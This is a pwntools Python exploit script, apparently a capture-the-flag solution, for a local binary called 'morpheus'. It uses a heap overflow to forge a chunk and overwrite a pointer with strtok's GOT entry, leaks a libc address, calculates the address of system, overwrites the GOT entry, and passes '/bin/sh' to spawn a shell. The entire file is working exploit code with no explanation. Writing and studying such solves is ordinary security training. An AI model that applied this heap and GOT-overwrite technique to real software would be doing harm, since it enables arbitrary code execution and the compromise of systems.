from pwn import *

p = process("./morpheus")

def change_name(id, payload):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("ID: ", str(id))
    p.sendline(payload)

def heap_overflow():
    padding = 40

    payload = ""
    payload += "A" * padding
    payload += p32(0x21) #fake chunk
    payload += "A" * 4
    payload += p32(0) * 2
    payload += p32(0x77359423)
    payload += p32(0x77359423)

    #gdb.attach(p, '''
    #            b *service+464
    #            c
    #            ''')

    change_name(2, payload)
    p.sendline("4")
    p.interactive()

def got_overwrite():
    padding = 40
    binary = ELF("morpheus")
    libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
    fgets_got = binary.symbols["got.strtok"]
    log.info("Fgets@got: {}".format(hex(fgets_got)))

    payload = ""
    payload += "A" * padding
    payload += p64(0x21)
    #payload += "A" * 4 
    payload += p64(fgets_got)
    #payload += "\x00" * 4 memanipulasi heap chunk
    
    #gdb.attach(p, '''
    #            b *service+464
    #            c
    #            ''')
    
    change_name(2, payload)
    
    for _ in range(3):
        p.recvuntil("Name : ")

    libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
    log.info("Libc leak: {}".format(hex(libc_leak)))
    libc_base = libc_leak - libc.symbols["strtok"]
    log.info("Libc base: {}".format(hex(libc_base)))
    system_libc = libc_base + libc.symbols["system"]
    log.info("System@libc: {}".format(hex(system_libc)))
    
    change_name(3, p64(system_libc))
    change_name(1, "/bin/sh")
    p.interactive()

if __name__ == "__main__":
    #exploit()
    got_overwrite()